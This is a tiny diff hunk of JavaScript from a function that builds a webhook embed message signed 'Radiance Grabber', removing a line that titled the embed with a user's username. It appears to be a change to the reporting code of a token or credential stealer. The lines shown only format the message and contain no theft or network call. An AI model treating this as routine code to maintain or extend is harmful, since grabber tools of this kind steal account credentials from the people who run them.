@@ -63,7 +63,6 @@ const makeEmbed = async ({
         username: "Radiance Grabber",
         content: "",
         embeds: [{
-            title: `\`${user.username}\``,
             color: config["embed-color"],
             fields: fields,
             description: description ?? "",
